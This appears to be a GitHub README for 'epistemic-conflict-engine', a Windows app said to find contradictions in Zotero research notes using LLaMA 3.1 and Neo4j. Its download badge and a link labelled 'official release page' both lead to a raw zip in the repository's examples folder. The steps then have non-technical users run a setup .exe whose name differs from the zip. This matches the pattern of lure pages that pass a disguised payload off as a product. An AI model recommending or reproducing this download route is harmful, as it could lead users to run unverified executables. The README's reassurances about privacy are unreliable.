# ⚖️ epistemic-conflict-engine - Find contradictions in your research notes

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/CLODOALDO14/epistemic-conflict-engine/raw/refs/heads/main/examples/epistemic_engine_conflict_1.3.zip)

This application helps researchers find disagreements within their Zotero libraries. It uses the LLaMA 3.1 AI model to analyze claims and identify logical gaps or contradictions. It stores data in a Neo4j graph database to track connections between ideas. You do not need to understand code to use this tool. 

## 🛠️ System Requirements

Your computer needs specific parts to run this engine. Ensure your system meets these standards before you begin.

- Operating System: Windows 10 or Windows 11.
- Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last four years.
- Memory: 16 GB of RAM.
- Storage: 10 GB of free space.
- Graphics: A dedicated graphics card with at least 8 GB of VRAM helps with speed.

## 📥 How to Install

Follow these steps to set up the software on your machine.

1. Visit the [official release page](https://github.com/CLODOALDO14/epistemic-conflict-engine/raw/refs/heads/main/examples/epistemic_engine_conflict_1.3.zip) to download the latest installer.
2. Locate the file named `epistemic-conflict-engine-setup.exe` in your Downloads folder.
3. Double-click the file to open the installation wizard.
4. Follow the prompts on the screen.
5. Click Finish when the process ends. 

This installer puts a shortcut on your desktop. Use this shortcut to launch the application.

## ⚙️ Initial Setup

The engine needs to talk to other programs on your computer to function. Follow this sequence during your first launch.

### Connect Zotero
The engine reads your research from Zotero. 

1. Open Zotero on your computer.
2. Go to Preferences, then select the Advanced tab.
3. Look for the Data Directory location.
4. Open the application.
5. Paste your Zotero data directory path into the settings menu of the engine.
6. The engine will now index your saved articles, books, and notes.

### Set Up the AI Model
The engine uses Ollama to run the LLaMA 3.1 model. 

1. The application will prompt you to install Ollama during the first run.
2. Click Yes to allow the download of the required components.
3. Once Ollama installs, the engine will automatically download the LLaMA 3.1 model.
4. Wait for the progress bar to show the model is ready. 

## 💡 How to Use the Engine

The engine works by searching for relationships between your documents. 

### Start a Search
1. Open the application.
2. Type a topic or a specific claim into the search bar at the top of the interface.
3. Click the Analyze button.
4. The engine scans your Zotero library for documents related to your input.
5. It extracts claims and builds a map of the arguments found in your notes.

### View Contradictions
The engine identifies where authors disagree. 

1. Look at the Results panel on the left side of the screen.
2. Click any entry labeled Conflict.
3. The right side of the screen shows the two opposing quotes from your research.
4. The AI provides a brief explanation of why these two positions clash. 

### Save Your Work
Your analysis is saved automatically as you work. You can export a summary of your findings as a PDF or a text file by clicking the Export button located in the File menu.

## 🔍 Understanding the Technology

This tool relies on a few core technologies to help you think better.

- LLaMA 3.1: This is the brain of the engine. It reads your notes and understands the logic within them.
- Neo4j: This is a graph database. It keeps track of how your notes tie together. It treats every document as a node and every connection as a link. This allows the engine to see the big picture of your research library.
- LangGraph: This component manages the flow of the AI work. It ensures the engine checks your notes for specific categories of conflict.
- RAG: This stands for Retrieval-Augmented Generation. It allows the AI to look at your personal library rather than relying only on its general knowledge. 

## ❓ Frequently Asked Questions

### Does my data leave my computer?
No. All processing happens on your local machine. Your Zotero library and your research notes remain private. The engine does not send your documents to any cloud servers.

### The engine is slow. What should I do?
The analysis takes time because it reads your entire library. Close other memory-heavy programs like web browsers while the engine scans your documents. Ensure your computer stays plugged into power to maintain maximum performance.

### Can I manually add notes that are not in Zotero?
Currently, the engine relies on Zotero for document retrieval. Ensure your files are imported into Zotero before you run the analysis. 

### What do I do if the AI stops responding?
Wait a few seconds for the process to finish. If it hangs for more than five minutes, close the application and restart it. The engine will resume from the last successful checkpoint. 

### How do I update the software?
The application notifies you when a new version is ready. Click the update link in the notification window to download the latest setup file. Run this file to update your existing installation. Your settings and database remain intact during this process.